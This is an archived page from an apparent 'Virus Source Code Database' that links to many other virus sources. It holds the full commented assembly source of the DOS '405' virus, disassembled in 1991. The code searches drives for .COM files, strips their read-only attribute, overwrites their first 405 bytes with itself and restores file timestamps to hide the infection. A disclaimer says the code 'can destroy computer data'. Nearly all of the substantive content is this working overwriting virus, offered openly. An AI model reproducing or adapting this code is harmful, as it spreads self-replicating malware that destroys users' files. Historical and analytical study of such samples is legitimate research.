<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: 405_a_asm</title>
<meta name="KEYWORDS" content="405_a.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for 405_a.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="1000year_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1000year_asm.php">1000year_asm</a><br><a href="102_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/102_asm.php">102_asm</a><br><a href="1260__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1260__asm.php">1260__asm</a><br><a href="1260_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1260_asm.php">1260_asm</a><br><a href="133_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/133_asm.php">133_asm</a><br><a href="134_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/134_asm.php">134_asm</a><br><a href="1575_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575_asm.php">1575_asm</a><br><a href="1575_e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575_e_asm.php">1575_e_asm</a><br><a href="1575-org_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575-org_asm.php">1575-org_asm</a><br><a href="1701_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1701_asm.php">1701_asm</a><br><a href="1704__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1704__asm.php">1704__asm</a><br><a href="1704_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1704_asm.php">1704_asm</a><br><a href="1808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1808_asm.php">1808_asm</a><br><a href="1888_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1888_asm.php">1888_asm</a><br><a href="1963_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1963_asm.php">1963_asm</a><br><a href="196_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/196_asm.php">196_asm</a><br><a href="1992_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1992_asm.php">1992_asm</a><br><a href="1ststar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1ststar_asm.php">1ststar_asm</a><br><a href="1stvirus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1stvirus_asm.php">1stvirus_asm</a><br><a href="203_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/203_asm.php">203_asm</a><br><a href="2249_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2249_asm.php">2249_asm</a><br><a href="2350_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2350_asm.php">2350_asm</a><br><a href="2400_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2400_asm.php">2400_asm</a><br><a href="2471_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2471_asm.php">2471_asm</a><br><a href="2501_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2501_asm.php">2501_asm</a><br><a href="2564_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2564_asm.php">2564_asm</a><br><a href="2626_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2626_asm.php">2626_asm</a><br><a href="2715_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2715_asm.php">2715_asm</a><br><a href="29bytes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/29bytes_asm.php">29bytes_asm</a><br><a href="3066_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/3066_asm.php">3066_asm</a><br><a href="30_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/30_asm.php">30_asm</a><br><a href="334_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/334_b_asm.php">334_b_asm</a><br><a href="334-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/334-b_asm.php">334-b_asm</a><br><a href="382_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/382_asm.php">382_asm</a><br><a href="405_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_a_asm.php">405_a_asm</a><br><a href="405__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405__asm.php">405__asm</a><br><a href="405_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_asm.php">405_asm</a><br><a href="405_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_b_asm.php">405_b_asm</a><br><a href="4096a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096a_asm.php">4096a_asm</a><br><a href="4096____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096____asm.php">4096____asm</a><br><a href="4096___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096___asm.php">4096___asm</a><br><a href="4096__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096__asm.php">4096__asm</a><br><a href="4096_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096_asm.php">4096_asm</a><br><a href="42bites_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/42bites_asm.php">42bites_asm</a><br><a href="44__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/44__asm.php">44__asm</a><br><a href="44_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/44_asm.php">44_asm</a><br><a href="45_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/45_asm.php">45_asm</a><br><a href="500_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/500_asm.php">500_asm</a><br><a href="5120_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/5120_asm.php">5120_asm</a><br><a href="512__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512__asm.php">512__asm</a><br><a href="512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_asm.php">512_asm</a><br><a href="512_e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_e_asm.php">512_e_asm</a><br><a href="512-e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512-e_asm.php">512-e_asm</a><br><a href="512_f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_f_asm.php">512_f_asm</a><br><a href="512-f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512-f_asm.php">512-f_asm</a><br><a href="534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/534_asm.php">534_asm</a><br><a href="541__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/541__asm.php">541__asm</a><br><a href="541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/541_asm.php">541_asm</a><br><a href="560_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/560_asm.php">560_asm</a><br><a href="578_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/578_asm.php">578_asm</a><br><a href="583_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/583_asm.php">583_asm</a><br><a href="583virus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/583virus_asm.php">583virus_asm</a><br><a href="648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/648_asm.php">648_asm</a><br><a href="7son_284_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son_284_asm.php">7son_284_asm</a><br><a href="7son_332_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son_332_asm.php">7son_332_asm</a><br><a href="7son426b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son426b_asm.php">7son426b_asm</a><br><a href="7son-473_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son-473_asm.php">7son-473_asm</a><br><a href="7son473b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son473b_asm.php">7son473b_asm</a><br><a href="7th_son4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7th_son4_asm.php">7th_son4_asm</a><br><a href="7th_son__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7th_son__asm.php">7th_son__asm</a><br><a href="808__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/808__asm.php">808__asm</a><br><a href="808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/808_asm.php">808_asm</a><br><a href="80hex_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/80hex_asm.php">80hex_asm</a><br><a href="90210_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/90210_asm.php">90210_asm</a><br></td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/a/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/a/index.php'" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/b/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/b/index.php'" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/c/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/c/index.php'" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/d/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/d/index.php'" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/e/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/e/index.php'" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/f/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/f/index.php'" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/h/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/h/index.php'" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/i/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/i/index.php'" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/j/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/j/index.php'" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/k/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/k/index.php'" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/l/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/l/index.php'" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/m/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/m/index.php'" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/n/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/n/index.php'" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/o/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/o/index.php'" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/p/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/p/index.php'" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/q/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/q/index.php'" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/r/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/r/index.php'" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/s/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/s/index.php'" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/t/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/t/index.php'" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/u/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/u/index.php'" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/v/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/v/index.php'" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/w/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/w/index.php'" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/x/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/x/index.php'" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/y/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/y/index.php'" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;405 virus
;disassembled 10th March 1991 by Fred Deakin.
;

start:
       xchg si,ax		     ;96	  }marker bytes ?
       add [bx+si],al		     ;00 00	  }
       sahf			     ;9e	  }
       add [bx+si],al		     ;00 00	  }
       nop			     ;90	  }
       mov ax,0000h		     ;clear ax
       mov byte es:[drive],al	     ;default drive?
       mov byte es:[dir_path],al     ;clear first byte in directory path
       mov byte es:[l_drvs],al	     ;clear logical drives
       push ax			     ;save ax
       mov ah,19h		     ;get current drive
       int 21h			     ;call msdos
       mov byte es:[drive],al	     ;and save
       mov ah,47h		     ;get directory path
       add al,01h		     ;add 1 to drive code
       push ax			     ;and save
       mov dl,al		     ;move drive code to dl
       lea si,[dir_path]	     ;si=offset address of directory buffer
       int 21h			     ;call msdos
       pop ax			     ;get back drive code
       mov ah,0eh		     ;set default drive
       sub al,01h		     ;subtract and get logical drive
       mov dl,al		     ;drive wanted
       int 21h			     ;call msdos
       mov byte es:[l_drvs],al	     ;store how many logical drives
l0139:
       mov al,byte es:[drive]	     ;get default drive
       cmp al,00h		     ;drive a:?
       jnz l0152		     ;if not jump forward
       mov ah,0eh		     ;set default drive
       mov dl,02h		     ;drive c:
       int 21h			     ;call msdos
       mov ah,19h		     ;get current drive
       int 21h			     ;call msdos
       mov byte es:[c_drv],al	      ;and save
       jmp l0179		     ;jump forward
       nop			     ;no operation
l0152:
       cmp al,01h		     ;drive b:?
       jnz l0167		     ;jump forward if not
       mov ah,0eh		     ;set default drive
       mov dl,02h		     ;to drive c:
       int 21h			     ;call msdos
       mov ah,19h		     ;get current drive
       int 21h			     ;call msdos
       mov byte es:[c_drv],al	      ;and save
       jmp l0179		     ;jump forward
       nop			     ;no operation
l0167:
       cmp al,02h		     ;drive c:?
       jnz l0179		     ;if not jump forward
       mov ah,0eh		     ;set default drive
       mov dl,00h		     ;drive a:
       int 21h			     ;call msdos
       mov ah,19h		     ;get current drive
       int 21h			     ;call msdos
       mov byte es:[c_drv],al	     ;and save
l0179:
       mov ah,4eh		     ;search for first
       mov cx,0001h		     ;file attributes
       lea dx,[f_name]		     ;point to file name
       int 21h			     ;call msdos
       jb l0189 		     ;no .COM files
       jmp l01a9		     ;found one
       nop			     ;no operation
l0189:
       mov ah,3bh		     ;set directory
       lea dx,[l0297]		     ;point to path
       int 21h			     ;call msdos
       mov ah,4eh		     ;search for first
       mov cx,0011h		     ;set attributes
       lea dx,[l0292]		     ;
       int 21h			     ;call msdos
       jb l0139 		     ;no .COM files
       jmp l0179		     ;jump back
l01a0:
       mov ah,4fh		     ;search for next
       int 21h			     ;call msdos
       jb l0189 		     ;no .COM files found
       jmp l01a9		     ;found one
       nop			     ;no operation
l01a9:
       mov ah,3dh		     ;open file
       mov al,02h		     ;for read/write access
       mov dx,009eh		     ;offset address of path name
       int 21h			     ;call msdos
       mov bx,ax		     ;save file handle
       mov ah,3fh		     ;read file
       mov cx,0195h		     ;would you believe 405 bytes to read
       nop			     ;no operation
       mov dx,0e000h		     ;offset address of buffer
       nop			     ;no operation
       int 21h			     ;call msdos
       mov ah,3eh		     ;close file
       int 21h			     ;call msdos
       mov bx,es:[0e000h]	     ;get first byte of loaded buffer
       cmp bx,9600h		     ;405 virus already installed?
       jz l01a0 		     ;yes jump back and search for next
       mov ah,43h		     ;get/set file attributes
       mov al,00h		     ;get file attributes
       mov dx,009eh		     ;offset address of path name
       int 21h			     ;call msdos
       mov ah,43h		     ;get/set file attributes
       mov al,01h		     ;set file attributes
       and cx,00feh		     ;no files read only
       int 21h			     ;call msdos
       mov ah,3dh		     ;open file
       mov al,02h		     ;for read/write access
       mov dx,009eh		     ;offset address of path name
       int 21h			     ;call msdos
       mov bx,ax		     ;save file handle in bx
       mov ah,57h		     ;get/set date and time
       mov al,00h		     ;get file date and time
       int 21h			     ;call msdos
       push cx			     ;file time
       push dx			     ;file date
       mov dx,cs:[0295h]	     ;get variable byte?
       mov cs:[0e195h],dx	     ;place at end of file loaded
       mov dx,cs:[0e001h]	     ;get second byte in buffer
       lea cx,ds:[0194h]	     ;
       sub dx,cx		     ;
       mov cs:[0295h],dx	     ;place at end of file
       mov ah,40h		     ;write file
       mov cx,0195h		     ;amount of bytes to write
       nop			     ;no operation
       lea dx,[start]		     ;get starting location
       int 21h			     ;call msdos
       mov ah,57h		     ;get/set file date and time
       mov al,01h		     ;set file date and time
       pop dx			     ;file date
       pop cx			     ;file time
       int 21h			     ;call msdos
       mov ah,3eh		     ;close file
       int 21h			     ;call msdos
       mov dx,cs:[0e195h]	     ;get variable
       mov cs:[0295h],dx	     ;place at end of file
       jmp l0234		     ;jump forward
       nop			     ;no operation
l0234:
       mov ah,0eh		     ;set default drive
       mov dl,byte cs:[drive]	     ;get back original default drive
       int 21h			     ;call msdos
       mov ah,3bh		     ;set directory
       lea dx,[c_drv]		     ;8d 16 4a 02
       int 21h			     ;call msdos
       mov ah,00h		     ;return to dos
       int 21h			     ;call msdos
drive:
       db 02				 ;drive variable
c_drv:
       db 00				 ;current drive
dir_path:
       db "TEST"
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
l_drvs:
	db 00				 ;how many logical drives on system
f_name:
	db "*.COM"
	db 0h
l0292:
	db 2ah,00h
l0293:
	db 0e9h,00h
l0295:
	db 00h
l0297:

</textarea></td></tr></table></body></html>
